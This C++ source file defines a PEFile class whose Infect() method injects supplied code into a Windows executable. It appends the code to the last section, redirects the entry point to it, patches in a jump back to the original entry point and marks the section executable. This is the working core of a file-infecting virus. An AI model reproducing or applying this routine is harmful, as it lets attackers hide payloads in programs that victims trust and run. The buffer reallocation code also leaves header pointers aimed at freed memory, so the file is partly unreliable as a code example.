#include "PEFile.h"
#include <fstream>

PEFile::PEFile(char const* filePath)
	:
	m_filePath(filePath),
	m_fileBuffer(NULL),
	m_fileSize(0),
	m_bufferSize(0),
	m_dosHeader(NULL),
	m_ntHeaders(NULL),
	m_firstSectionHeader(NULL)
{
	LoadFile();
	UpdateHeaderPointers();
}
PEFile::~PEFile(void)
{
	if (m_fileBuffer)
		delete[] m_fileBuffer;

}
void PEFile::Save(void) const
{
	SaveAs(m_filePath.c_str());
}
void PEFile::SaveAs(char const* filePath) const
{
	std::ofstream file(filePath, std::ofstream::binary);
	if (!file.good())
		throw std::runtime_error("PEFile::SaveAs - Error opening a file for writing.");
	file.write(m_fileBuffer, m_fileSize);
	if (!file.good())
		throw std::runtime_error("PEFile::SaveAs - Error writing to a file.");
}
void PEFile::LoadFile(void)
{
	std::ifstream file(m_filePath, std::ifstream::binary);
	if (!file.good())
		throw std::runtime_error("PEFile::LoadFile - File not found.");

	file.seekg(0, file.end);
	m_fileSize = file.tellg();
	file.seekg(0);

	if (m_fileSize < 1)
		throw std::runtime_error("PEFile::LoadFile - Incorrect File size.");

	m_bufferSize = m_fileSize * 2;
	m_fileBuffer = new char[m_bufferSize];
	file.read(m_fileBuffer, m_fileSize);

	if (!file.good() || file.gcount() != m_fileSize)
		throw std::runtime_error("PEFile::LoadFile - Error reading the file.");
}
void PEFile::Infect(char const* code, size_t size, DWORD entryPointOffset, DWORD originalEntryPointOffset)
{
	DWORD orignalEntryPoint = m_ntHeaders->OptionalHeader.AddressOfEntryPoint;

	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
	char* newDataPointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize;
	memcpy(newDataPointer, reinterpret_cast<unsigned char const*>(code), size);

	m_ntHeaders->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress + lastSection->Misc.VirtualSize + entryPointOffset;

	//memcpy(newDataPointer + originalEntryPointOffset, 1);
	DWORD absoluteOEPAddr = m_ntHeaders->OptionalHeader.ImageBase + orignalEntryPoint;
	memcpy(newDataPointer + originalEntryPointOffset, &absoluteOEPAddr, sizeof(DWORD));
	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
	ExpandLastSection(size);
}
void PEFile::ExpandLastSection(size_t size)
{
	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
	
	if (m_fileSize + size > m_bufferSize)
		ReallocateBuffer((m_fileSize + size) * 2);

	size_t newVirtualSize = lastSection->Misc.VirtualSize + size;
	if (newVirtualSize > lastSection->SizeOfRawData)
	{
		size_t alignedSize = AlignSize(lastSection->Misc.VirtualSize + size, m_ntHeaders->OptionalHeader.FileAlignment);
		lastSection->SizeOfRawData = alignedSize;

		m_fileSize += AlignSize(alignedSize, m_ntHeaders->OptionalHeader.SectionAlignment);
	}
	lastSection->Misc.VirtualSize += size;
	m_ntHeaders->OptionalHeader.SizeOfImage = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
}
/*void PEFile::AppendLastSection(char const* data, size_t size)
{
	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
	char* dataPointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize;
	memcpy(dataPointer, data, size);
	ExpandLastSection(size);
}*/
void PEFile::ReallocateBuffer(size_t size)
{
	char* newBuffer = new char[size];
	memcpy(newBuffer, m_fileBuffer, m_fileSize);
	try
	{
		UpdateHeaderPointers(); // Should never really throw here, but just incase, to avoid memory leak
	}
	catch (std::runtime_error& e)
	{
		delete[] newBuffer;
		throw std::runtime_error("PEFile::ReallocateBuffer - Could not recognize headers after reallocation.");
	}
	delete[] m_fileBuffer;
	m_fileBuffer = newBuffer;
	m_bufferSize = size;
}
void PEFile::UpdateHeaderPointers(void)
{
	m_dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(m_fileBuffer);
	if (m_dosHeader->e_magic != 0x5A4D)
		throw std::runtime_error("PEFile::UpdateHeaderPointers - DOS Header not found (Probably not a PE file).");
	m_ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(m_fileBuffer + m_dosHeader->e_lfanew);
	if (m_ntHeaders->OptionalHeader.Magic != 0x010B)
		throw std::runtime_error("PEFile::UpdateHeaderPointers - NT Header not found (Probably a x64 file).");
	m_firstSectionHeader = IMAGE_FIRST_SECTION(m_ntHeaders);
}
size_t PEFile::GetFileSize(void) const
{
	return m_fileSize;
}
size_t PEFile::GetNumberOfSections(void) const
{
	return m_ntHeaders->FileHeader.NumberOfSections;
}
size_t PEFile::AlignSize(size_t size, size_t alignment)
{
	size_t alignedSize = alignment;
	while (alignedSize < size)
	{
		alignedSize += alignment;
	}
	return alignedSize;
}